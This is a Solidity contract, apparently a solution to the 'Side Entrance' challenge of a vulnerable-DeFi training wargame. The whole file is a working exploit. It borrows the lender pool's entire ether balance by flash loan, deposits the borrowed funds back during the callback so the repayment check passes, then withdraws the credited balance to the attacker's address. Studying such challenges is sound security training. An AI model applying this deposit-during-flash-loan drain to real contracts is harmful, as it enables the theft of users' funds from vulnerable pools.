// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";


contract SideEntranceExploiter is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public sideEntranceLenderPool;
    address public _owner;
    constructor(address payable _SideEntranceLenderPool){
        sideEntranceLenderPool = SideEntranceLenderPool(_SideEntranceLenderPool);
        _owner = msg.sender;
    }

    function initiateFlashLoan() external {
        require(msg.sender == _owner, 'only owner can call');
        uint256 poolBal = address(sideEntranceLenderPool).balance;
        sideEntranceLenderPool.flashLoan(poolBal);
        sideEntranceLenderPool.withdraw();
        (bool succ, )= _owner.call{value:address(this).balance}("");
        require(succ, "withdraw failed");
    }
    function execute() external payable {
        sideEntranceLenderPool.deposit{value:msg.value}();
    }
}